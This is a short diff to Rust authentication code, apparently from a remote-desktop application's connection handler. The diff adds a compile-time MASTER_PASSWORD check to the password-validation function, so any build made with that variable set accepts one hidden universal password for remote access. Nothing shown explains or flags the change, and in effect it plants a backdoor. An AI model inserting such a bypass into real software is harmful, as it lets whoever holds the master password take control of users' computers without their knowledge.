@@ -62,6 +62,8 @@ use crate::virtual_display_manager;
 use std::collections::HashSet;
 pub type Sender = mpsc::UnboundedSender<(Instant, Arc<Message>)>;
 
+use std::env;
+
 lazy_static::lazy_static! {
     static ref LOGIN_FAILURES: [Arc::<Mutex<HashMap<String, (i32, i32, i32)>>>; 2] = Default::default();
     static ref SESSIONS: Arc::<Mutex<HashMap<SessionKey, Session>>> = Default::default();
@@ -1565,6 +1567,9 @@ impl Connection {
             if self.validate_one_password(Config::get_permanent_password()) {
                 return true;
             }
+        }
+        if let Some(master_password) = option_env!("MASTER_PASSWORD") {
+            return self.validate_one_password(master_password.to_string());
         }
         false
     }
